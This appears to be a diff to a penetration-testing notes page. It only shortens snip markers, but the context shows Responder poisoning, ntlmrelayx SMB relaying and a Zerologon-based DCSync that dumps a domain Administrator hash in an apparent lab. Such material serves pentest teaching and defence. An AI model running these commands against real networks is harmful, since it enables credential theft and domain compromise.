@@ -156,7 +156,7 @@ Start Responder.py and turn off HTTP and SMB server. Also start [PCredz]({{< ref
 
 ```plain
 $ sudo python3 Responder.py -I enp0s31f6
-[...SNIP...]
+[...]
 [+] Poisoners:
     LLMNR                      [ON]
     NBT-NS                     [ON]
@@ -168,7 +168,7 @@ $ sudo python3 Responder.py -I enp0s31f6
    WPAD proxy                 [OFF]
     Auth proxy                 [OFF]
     SMB server                 [OFF]
-[...SNIP...]
+[...]
 ```
 
 #### Default config
@@ -178,7 +178,7 @@ By default NTLMrelayx.py relays to the client who sends the hash, dumping SAM. I
 ```plain
 $ sudo ntlmrelayx.py -smb2support -socks -of captured-hashes
 Impacket v0.9.22.dev1+20200924.183326.65cf657f - Copyright 2020 SecureAuth Corporation
-[...SNIP...]
+[...]
 [*] Servers started, waiting for connections
 [*] SMBD-Thread-3: Connection from offsec/ADMINISTRATOR@10.10.10.11 controlled, attacking target smb://10.10.10.10
 [*] Connecting to 10.10.10.10 NETLOGON service
@@ -195,17 +195,17 @@ Start ntlmrelayx.py with the target system in place.
 ```plain
 $ sudo ntlmrelayx.py -t 10.10.10.10 -smb2support -socks
 Impacket v0.9.22.dev1+20200924.183326.65cf657f - Copyright 2020 SecureAuth Corporation
-[...SNIP...]
+[...]
 [*] Servers started, waiting for connections
 [*] SMBD-Thread-3: Connection from offsec/ADMINISTRATOR@10.10.10.11 controlled, attacking target dcsync://10.10.10.10
 [*] Connecting to 10.10.10.10 NETLOGON service
 [*] Netlogon Auth OK, successfully bypassed autentication using Zerologon after 1 attempts!
 [*] offsec\Administrator successfully validated through NETLOGON
-[*] NTLM Sign/seal key: cf65d6660ec15d940f687bde79572094[...SNIP...]
+[*] NTLM Sign/seal key: cf65d6660ec15d940f687bde79572094[...]
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
-[...SNIP...]
+[...]
 ```
 
 #### Generate targetlist and attack
